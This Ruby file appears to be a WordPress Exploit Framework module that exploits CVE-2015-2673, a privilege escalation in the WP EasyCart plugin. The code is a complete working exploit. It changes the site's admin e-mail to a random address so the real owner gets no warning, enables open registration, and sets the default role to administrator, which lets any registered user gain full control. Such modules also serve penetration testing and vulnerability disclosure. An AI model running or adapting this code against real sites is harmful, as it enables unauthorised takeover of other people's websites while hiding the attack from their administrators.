# frozen_string_literal: true

class Wpxf::Auxiliary::EasyCartPrivilegeEscalation < Wpxf::Module
  include Wpxf
  include Wpxf::Net::HttpClient
  include Wpxf::WordPress::Login

  def initialize
    super

    update_info(
      name: 'EasyCart Plugin Privilege Escalation',
      desc: %(
        The WordPress WP EasyCart plugin from version 1.1.30 to 3.0.20
        allows authenticated users  of any user level to set any system
        option via a lack of validation in the ec_ajax_update_option and
        ec_ajax_clear_all_taxrates functions located in /inc/admin/admin_ajax_functions.php.

        The module first changes the admin e-mail address to prevent any
        notifications being sent to the actual administrator during the
        attack, re-enables user registration in case it has been disabled
        and sets the default role to be administrator. This will allow
        for the user to create a new account with admin privileges via
        the default registration page found at /wp-login.php?action=register.
      ),
      desc_preformatted: true,
      author: [
        'rastating' # Discovery and WPXF module
      ],
      references: [
        ['CVE', '2015-2673'],
        ['WPVDB', '7808'],
        ['URL', 'http://blog.rastating.com/wp-easycart-privilege-escalation-information-disclosure']
      ],
      date: 'Feb 25 2015'
    )
  end

  def check
    check_plugin_version_from_readme('wp-easycart', '3.0.21', '1.1.30')
  end

  def requires_authentication
    true
  end

  def set_wp_option(name, value)
    res = execute_post_request(
      url: wordpress_url_admin_ajax,
      params: { 'action' => 'ec_ajax_update_option' },
      body: { 'option_name' => name, 'option_value' => value },
      cookie: session_cookie
    )

    if res.nil?
      emit_error 'No response from the target', true
    elsif res.code != 200
      emit_warning "Server responded with code #{res.code}", true
    end

    res
  end

  def run
    return false unless super

    new_email = "#{Utility::Text.rand_alpha(5)}@#{Utility::Text.rand_alpha(5)}.com"
    emit_info "Changing admin e-mail address to #{new_email}..."
    if set_wp_option('admin_email', new_email).nil?
      emit_error 'Failed to change the admin e-mail address'
      return false
    end

    emit_info 'Enabling user registrations...'
    if set_wp_option('users_can_register', 1).nil?
      emit_error 'Failed to enable user registrations'
      return false
    end

    emit_info 'Setting the default user role...'
    if set_wp_option('default_role', 'administrator').nil?
      emit_error 'Failed to set the default user role'
      return false
    end

    register_url = normalize_uri(full_uri, 'wp-login.php?action=register')
    emit_success 'Privilege escalation complete'
    emit_success "Create a new account at #{register_url} to gain admin access."

    true
  end
end
